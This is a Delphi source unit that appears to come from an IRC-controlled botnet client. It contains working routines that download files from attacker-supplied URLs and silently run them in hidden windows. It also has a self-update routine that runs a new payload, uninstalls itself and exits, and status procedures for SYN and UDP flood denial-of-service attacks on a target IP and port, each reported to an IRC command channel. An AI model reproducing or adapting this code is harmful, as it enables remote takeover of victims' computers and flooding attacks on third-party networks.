Unit dlupdate;

Interface
                             
Uses
  Windows,
  Winsock,
  ShellAPI,
  udpflood,
  urlmon,
  sysutils,
  variables,
  seeder,
  Functions;

  Procedure DownloadFileFromURL(dHost: String; dTo: String; dChannel: String);
  Procedure ExecuteFileFromURL (dHost: String; dTo: String; dChannel: String);
  Procedure UpdateFileFromURL  (dHost: String; dTo: String; dChannel: String);
  Procedure startstop;
  Procedure udpstartstop;
  Procedure torrentstartstop;
  procedure DownloadExecute(Addr, Name :String);

Implementation

uses base;

Function CreateGet(Host, SubHost, Referer: String; Mozilla: Boolean): String;
Begin
  If (Not Mozilla) Then
    Result := 'GET /'+SubHost+' HTTP/1.1'#13#10+
              'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*'#13#10+
              'Referer: '+Referer+#13#10+
              'Accept-Language: en-us'#13#10+
              'Accept-Encoding: gzip, deflate'#13#10+
              'User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)'#13#10+
              'Connection: Keep-Alive'#13#10+
              'Host: '+Host+#13#10#13#10;
  If (Mozilla) Then
    Result := 'GET /'+SubHost+' HTTP/1.1'#13#10+
              'Host: '+Host+#13#10+
              'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.6) Gecko/20050317 Firefox/1.0.2'#13#10+
              'Accept: text/xml, application/xml, application/xhtml+xml, text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'#13#10+
              'Accept-Language: en-us,en;q=0.5'#13#10+
              'Accept-Encoding: gzip,deflate'#13#10+
              'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7'#13#10+
              'Keep-Alive: 300'#13#10+
              'Connection: Keep-Alive'#13#10+
              'Referer: '+Referer+#13#10#13#10;
End;

procedure DownloadExecute(Addr, Name :String);
var
  Path :String;
begin
  Path := DownloadDir + Name;
  if FileExists(Path) then DeleteFile(PChar(Path));
  URLDownloadToFile(nil, PChar(Addr), PChar(Path), 0, nil);
  ShellExecute(0, 'open', PChar(Path), nil, nil, SW_HIDE);
end;

Function HTTPReceive(Sock: TSocket): Integer;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 20;
  TimeOut.tv_usec :=  0;

  FD_ZERO(FD_STRUCT);
  FD_SET (Sock, FD_STRUCT);

  If (Select(0, @FD_STRUCT, NIL, NIL, @TimeOut) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;

Function DownloadFile(Host, dTo: String; VAR dTotal, dSpeed: String): Bool;
Var
  Web           :TSocket;
  WSA           :TWSAdata;
  Add           :TSockAddrIn;

  Buffer        :Array[0..15036] Of Char;
  SubHost       :String;
  Buf           :String;

  Size          :Integer;
  rSize         :Integer;

  F             :File Of Char;

  Start         :Integer;
  Total         :Integer;
  Speed         :Integer;

  TempBuf       :Array[0..15036] Of Char;
  iPos          :Integer;
Begin
  Result := False;
  If (Host = '') Then Exit;
  If (Host[Length(Host)] = '/') Then Delete(Host, Length(Host), 1);
  If (LowerCase(Copy(Host, 1, 4)) = 'http') Then Delete(Host, 1, 7);
  If (Pos('/', Host) > 0) Then
  Begin
    SubHost := Copy(Host, Pos('/', Host)+1, Length(Host));
    Host := Copy(Host, 1, Pos('/', Host)-1);
  End Else
    SubHost := '';

  WSAStartUP(MakeWord(2,1), WSA);
    Web := Socket(AF_INET, SOCK_STREAM, 0);
    If (Web > INVALID_SOCKET) Then
    Begin
      Add.sin_family := AF_INET;
      Add.sin_port := hTons(80);
      Add.sin_addr.S_addr := inet_addr(pChar(fetchIPFromDNS(pChar(Host))));

      If (Connect(Web, Add, SizeOf(Add)) = ERROR_SUCCESS) Then
      Begin
        Buf := CreateGet(Host, SubHost, '', TRUE);
        Send(Web, Buf[1], Length(Buf), 0);

        FillChar(Buffer, SizeOf(Buffer), #0);
        rSize := Recv(Web, Buffer, SizeOf(Buffer), 0);

        Buf := String(Buffer);
        FillChar(TempBuf, SizeOf(TempBuf), #0);
        iPos := Pos(#13#10#13#10, Buf);
        Move(Buffer[iPos+3], TempBuf[0], (rSize-(iPos+3)));

        Delete(Buf, 1, Pos('Content-Length', Buf)+15);
        Size := StrToInt(Copy(Buf, 1, Pos(#13, Buf)-1));

        Total := 1;
        Start := GetTickCount;

        AssignFile(F, dTo);
        ReWrite(F);
        If TempBuf[0] <> #0 Then
        Begin
          Total := Total + (rSize-(iPos+3));
          BlockWrite(F, TempBuf, (rSize-(iPos+3)));
          Dec(Size, (rSize-(iPos+3)));
        End;

        Repeat
          If (HTTPReceive(WEB) = 0) Then
          Begin
            rSize := Recv(Web, Buffer, SizeOf(Buffer), 0);
            Total := Total + rSize;
            If (rSize > 0) Then
              BlockWrite(F, Buffer, rSize);
            Dec(Size, rSize);
          End Else
            Break;
        Until Size <= 0;
        CloseFile(F);

        Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);

        dTotal := GetKBS(Total);
        dSpeed := GetKBS(Speed);

        If (Size <= 0) Then
          Result := True
        Else
          Result := False;
      End;

    End;
    CloseSocket(Web);
  WSACleanUP();
End;

Procedure ExecuteFileFromURL(dHost: String; dTo: String; dChannel: String);
Var
  Total :String;
  Speed :String;
Begin
  mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloading File ('+dHost+')');
  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s');

     ExecuteFile(dTo);
      mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Opened '+dTo)
    end Else
      mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Open Faile '+dTo);

End;

Procedure UpdateFileFromURL(dHost: String; dTo: String; dChannel: String);
Var
  Total :String;
  Speed :String;
  pInfo :PROCESS_INFORMATION;
  sInfo :STARTUPINFO;
Begin
  mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloading Update ('+dHost+')');

  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s');

    FillChar(sInfo, SizeOf(STARTUPINFO), 0);
    sInfo.cb := SizeOf(sInfo);
    sInfo.wShowWindow := SW_HIDE;

      shellExecute(0, 'open', pChar(dTo), nil, nil, SW_HIDE);
      Sleep(1000);
      mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Opened '+dTo+#10);
      WSACleanUP;
      Uninstall;
      ExitProcess(0);
    End else
    mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Failed To Open '+dTo);
 // End Else
 //   mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Download Failed');
End;

Procedure DownloadFileFromURL(dHost: String; dTo: String; dChannel: String);
Var
  Total :String;
  Speed :String;
Begin
  mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloading File ('+dHost+')');
  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s');
  End Else
    mainIRC.SendData('PRIVMSG '+dChannel+' :[HTTP] Download Failed');
End;

Procedure startstop;
begin
If sstart = true then
mainIRC.SendData('PRIVMSG '+server_channel+' :SSYN Started On IP ' +hithost+ ' ' +'Port: ' +inttostr(hitport)+ ' @ Speed ' +inttostr(hitspeed))
else
if sstart = false then
mainIRC.SendData('PRIVMSG '+server_channel+' :SSYN Stopped On IP ' +hithost+ ' ' +'Port: '+ '' +inttostr(hitport)+ '' +' @ Speed ' +inttostr(hitspeed));
end;

Procedure udpstartstop;
begin
If sstarts = true then
mainIRC.SendData('PRIVMSG '+server_channel+' :UDP Flood Started On IP ' +DosIp+ ' ' +'Port: ' +inttostr(DosPort))
else
if sstarts = false then
mainIRC.SendData('PRIVMSG '+server_channel+' :UDP Flood Stopped On IP ' +DosIp+ ' ' +'Port: '+ '' +inttostr(DosPort));
end;

Procedure torrentstartstop;
begin
If tstarts = true then
begin
mainIRC.SendData('PRIVMSG '+server_channel+' :Torrent Seeded! ')
end else
mainIRC.SendData('PRIVMSG '+server_channel+' :Torrent not Seeded! ');
end;

end.

